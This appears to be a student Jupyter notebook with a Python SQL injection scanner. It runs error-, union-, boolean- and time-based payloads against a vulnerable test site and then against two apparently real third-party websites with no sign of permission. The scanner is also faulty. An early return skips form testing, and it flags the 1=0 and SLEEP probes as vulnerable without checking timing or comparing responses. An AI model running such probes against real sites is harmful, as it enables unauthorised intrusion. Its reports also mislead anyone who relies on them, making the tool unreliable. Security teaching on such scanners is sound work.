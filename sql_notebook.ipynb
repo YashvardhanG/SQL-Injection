{
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "# **SQL INJECTION**\n",
        "\n",
        "## **Method 1:**\n",
        "## Finding vulnerabilities by extracting forms from a website\n",
        "\n",
        "Yashvardhan Gupta (20BCE1289)\n",
        "\n",
        "Devika Santosh (20BAI1099)"
      ],
      "metadata": {
        "id": "CxWZOR2bNngA"
      },
      "id": "CxWZOR2bNngA"
    },
    {
      "cell_type": "markdown",
      "id": "fe8fe787",
      "metadata": {
        "id": "fe8fe787"
      },
      "source": [
        "### Importing Modules"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "f019e282",
      "metadata": {
        "id": "f019e282"
      },
      "outputs": [],
      "source": [
        "import requests\n",
        "from bs4 import BeautifulSoup as bs\n",
        "from urllib.parse import urljoin\n",
        "from pprint import pprint"
      ]
    },
    {
      "cell_type": "markdown",
      "id": "bcb9120f",
      "metadata": {
        "id": "bcb9120f"
      },
      "source": [
        "### Start Session"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "0592228a",
      "metadata": {
        "id": "0592228a"
      },
      "outputs": [],
      "source": [
        "s = requests.Session()\n",
        "s.headers[\"User-Agent\"] = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36\""
      ]
    },
    {
      "cell_type": "markdown",
      "id": "574b6504",
      "metadata": {
        "id": "574b6504"
      },
      "source": [
        "### Functions to test for vulnerabilities"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "cf0feefb",
      "metadata": {
        "id": "cf0feefb"
      },
      "outputs": [],
      "source": [
        "def get_all_forms(url):\n",
        "    #Returns all the forms from a URL\n",
        "    soup = bs(s.get(url).content, \"html.parser\")\n",
        "    return soup.find_all(\"form\")\n",
        "\n",
        "\n",
        "def get_form_details(form):\n",
        "    #Extracts information about the HTML form\n",
        "    details = {}\n",
        "    # get form action (target url)\n",
        "    try:\n",
        "        action = form.attrs.get(\"action\").lower()\n",
        "    except:\n",
        "        action = None\n",
        "    # get form method (GET, POST, etc.)\n",
        "    method = form.attrs.get(\"method\", \"get\").lower()\n",
        "    # get all form input details\n",
        "    inputs = []\n",
        "    for input_tag in form.find_all(\"input\"):\n",
        "        input_type = input_tag.attrs.get(\"type\", \"text\")\n",
        "        input_name = input_tag.attrs.get(\"name\")\n",
        "        input_value = input_tag.attrs.get(\"value\", \"\")\n",
        "        inputs.append({\"type\": input_type, \"name\": input_name, \"value\": input_value})\n",
        "    # add details to dictionary\n",
        "    details[\"action\"] = action\n",
        "    details[\"method\"] = method\n",
        "    details[\"inputs\"] = inputs\n",
        "    return details\n",
        "\n",
        "\n",
        "def is_vulnerable(response):\n",
        "    #Boolean function that determines whether a page is vulnerable to SQL Injection based on its response\n",
        "    errors = {\n",
        "        # MySQL\n",
        "        \"you have an error in your sql syntax;\",\n",
        "        \"warning: mysql\",\n",
        "        # SQL Server\n",
        "        \"unclosed quotation mark after the character string\",\n",
        "        # Oracle\n",
        "        \"quoted string not properly terminated\",\n",
        "    }\n",
        "    for error in errors:\n",
        "        if error in response.content.decode().lower(): #if any error found\n",
        "            return True\n",
        "    return False #if no error detected\n",
        "\n",
        "def scan_sql_injection(url):\n",
        "    # test on URL\n",
        "    for c in \"\\\"'\":\n",
        "        new_url = f\"{url}{c}\" #add quote/double quote character to the URL\n",
        "        print(\"Testing\", new_url)\n",
        "        forms = get_all_forms(url)\n",
        "        print(f\"Detected {len(forms)} form(s) on {url}.\")\n",
        "        res = s.get(new_url) #make the HTTP request\n",
        "        if is_vulnerable(res):\n",
        "            # SQL Injection detected on the URL itself, \n",
        "            # no need to preceed for extracting forms and submitting them\n",
        "            print(\"SQL Injection vulnerability detected on:\", new_url)\n",
        "            return\n",
        "        else:\n",
        "            print(\"No vulnerability detected on: \", new_url)\n",
        "            return\n",
        "            \n",
        "    # test on HTML forms\n",
        "    forms = get_all_forms(url)\n",
        "    print(f\"Detected {len(forms)} form(s) on {url}.\")\n",
        "    for form in forms:\n",
        "        form_details = get_form_details(form)\n",
        "        for c in \"\\\"'\":\n",
        "            # the data body we want to submit\n",
        "            data = {}\n",
        "            for input_tag in form_details[\"inputs\"]:\n",
        "                if input_tag[\"value\"] or input_tag[\"type\"] == \"hidden\":\n",
        "                    # any input form that has some value or hidden,\n",
        "                    # just use it in the form body\n",
        "                    try:\n",
        "                        data[input_tag[\"name\"]] = input_tag[\"value\"] + c\n",
        "                    except:\n",
        "                        pass\n",
        "                elif input_tag[\"type\"] != \"submit\":\n",
        "                    # all others except submit, use some junk data with special character\n",
        "                    data[input_tag[\"name\"]] = f\"test{c}\"\n",
        "            # join the url with the action (form request URL)\n",
        "            url = urljoin(url, form_details[\"action\"])\n",
        "            if form_details[\"method\"] == \"post\":\n",
        "                res = s.post(url, data=data)\n",
        "            elif form_details[\"method\"] == \"get\":\n",
        "                res = s.get(url, params=data)\n",
        "            # test whether the resulting page is vulnerable\n",
        "            if is_vulnerable(res):\n",
        "                print(\"SQL Injection vulnerability detected on:\", url)\n",
        "                print(\"Form:\")\n",
        "                pprint(form_details)\n",
        "                break   "
      ]
    },
    {
      "cell_type": "markdown",
      "id": "4c33fa28",
      "metadata": {
        "id": "4c33fa28"
      },
      "source": [
        "##Error-based SQL injection\n",
        "inserts a malicious query to get an error that displays a message containing sensitive information about the database"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "a2d84ba4",
      "metadata": {
        "id": "a2d84ba4",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "1d8fc513-d796-4d53-caf0-92fb94bd5a7b"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Testing http://testphp.vulnweb.com/listproducts.php?cat=1%27\"\n",
            "Detected 1 form(s) on http://testphp.vulnweb.com/listproducts.php?cat=1%27.\n",
            "SQL Injection vulnerability detected on: http://testphp.vulnweb.com/listproducts.php?cat=1%27\"\n"
          ]
        }
      ],
      "source": [
        "url=\"http://testphp.vulnweb.com/listproducts.php?cat=1%27\"\n",
        "scan_sql_injection(url)"
      ]
    },
    {
      "cell_type": "markdown",
      "id": "b7e87c77",
      "metadata": {
        "id": "b7e87c77"
      },
      "source": [
        "##Union-based SQL injection\n",
        "When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the UNION keyword can be used to retrieve data from other tables within the database."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "f4dae1a8",
      "metadata": {
        "id": "f4dae1a8",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "c60fc6ee-93c9-46d3-bb7c-eb48d2324bca"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Testing http://testphp.vulnweb.com/artists.php?artist=-1%20UNION%20SELECT%201,version(),current_user()\"\n",
            "Detected 1 form(s) on http://testphp.vulnweb.com/artists.php?artist=-1%20UNION%20SELECT%201,version(),current_user().\n",
            "SQL Injection vulnerability detected on: http://testphp.vulnweb.com/artists.php?artist=-1%20UNION%20SELECT%201,version(),current_user()\"\n"
          ]
        }
      ],
      "source": [
        "url=\"http://testphp.vulnweb.com/artists.php?artist=-1%20UNION%20SELECT%201,version(),current_user()\"\n",
        "scan_sql_injection(url)"
      ]
    },
    {
      "cell_type": "markdown",
      "id": "0a30810b",
      "metadata": {
        "id": "0a30810b"
      },
      "source": [
        "##Boolean-based SQL injection\n",
        "relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "c675714e",
      "metadata": {
        "id": "c675714e",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "05cfdaf6-c168-49d2-c624-a394867ea168"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Testing http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=1\"\n",
            "Detected 1 form(s) on http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=1.\n",
            "SQL Injection vulnerability detected on: http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=1\"\n"
          ]
        }
      ],
      "source": [
        "#1=1\n",
        "url1=\"http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=1\" #http://testphp.vulnweb.com/artists.php?artist=1 AND 1=1\n",
        "scan_sql_injection(url1)"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#1=0\n",
        "url2=\"http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=0\" #http://testphp.vulnweb.com/artists.php?artist=1 AND 1=0\n",
        "scan_sql_injection(url2)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "94Ohb4wQfDLi",
        "outputId": "43d15580-8253-4b91-d0e7-f5da413e5f16"
      },
      "id": "94Ohb4wQfDLi",
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Testing http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=0\"\n",
            "Detected 1 form(s) on http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=0.\n",
            "SQL Injection vulnerability detected on: http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=0\"\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "id": "3d364545",
      "metadata": {
        "id": "3d364545"
      },
      "source": [
        "##Time-based SQL injection\n",
        "relies on sending an SQL query to the database which forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "ec1df0cf",
      "metadata": {
        "id": "ec1df0cf",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "e3fc365a-a5bf-4e30-cb09-5ed9d527131e"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Testing http://testphp.vulnweb.com/artists.php?artist=1-SLEEP(3)\"\n",
            "Detected 1 form(s) on http://testphp.vulnweb.com/artists.php?artist=1-SLEEP(3).\n",
            "SQL Injection vulnerability detected on: http://testphp.vulnweb.com/artists.php?artist=1-SLEEP(3)\"\n"
          ]
        }
      ],
      "source": [
        "#this will wait 3 seconds before responding\n",
        "url=\"http://testphp.vulnweb.com/artists.php?artist=1-SLEEP(3)\"\n",
        "scan_sql_injection(url)"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "##Form SQL Detection"
      ],
      "metadata": {
        "id": "BV2d1cigTbio"
      },
      "id": "BV2d1cigTbio"
    },
    {
      "cell_type": "code",
      "source": [
        "url = \"http://vacationet.com/resort.php?id=22\"\n",
        "scan_sql_injection(url)"
      ],
      "metadata": {
        "id": "l8kqvTH0Zauo",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "46d86647-02d9-4822-cda0-c1d3545c0b19"
      },
      "id": "l8kqvTH0Zauo",
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Testing http://vacationet.com/resort.php?id=22\"\n",
            "Detected 2 form(s) on http://vacationet.com/resort.php?id=22.\n",
            "No vulnerability detected on:  http://vacationet.com/resort.php?id=22\"\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "url = \"http://jokusoftware.cz/file.php?id=icqj3\"\n",
        "scan_sql_injection(url)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "gGb3NBbzZf63",
        "outputId": "3af6d283-a452-485f-c766-4da73b870b68"
      },
      "id": "gGb3NBbzZf63",
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Testing http://jokusoftware.cz/file.php?id=icqj3\"\n",
            "Detected 0 form(s) on http://jokusoftware.cz/file.php?id=icqj3.\n",
            "No vulnerability detected on:  http://jokusoftware.cz/file.php?id=icqj3\"\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "##Safe Query"
      ],
      "metadata": {
        "id": "YAQj9Zv6gMSI"
      },
      "id": "YAQj9Zv6gMSI"
    },
    {
      "cell_type": "code",
      "source": [
        "url2=\"http://testphp.vulnweb.com/\"\n",
        "scan_sql_injection(url2)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "z5fH4hDwVLES",
        "outputId": "4a293b6e-0b0e-42ca-d722-ed9bf23d3f03"
      },
      "id": "z5fH4hDwVLES",
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Testing http://testphp.vulnweb.com/\"\n",
            "Detected 1 form(s) on http://testphp.vulnweb.com/.\n",
            "No vulnerability detected on:  http://testphp.vulnweb.com/\"\n"
          ]
        }
      ]
    }
  ],
  "metadata": {
    "kernelspec": {
      "display_name": "Python 3 (ipykernel)",
      "language": "python",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.10.3"
    },
    "colab": {
      "provenance": []
    }
  },
  "nbformat": 4,
  "nbformat_minor": 5
}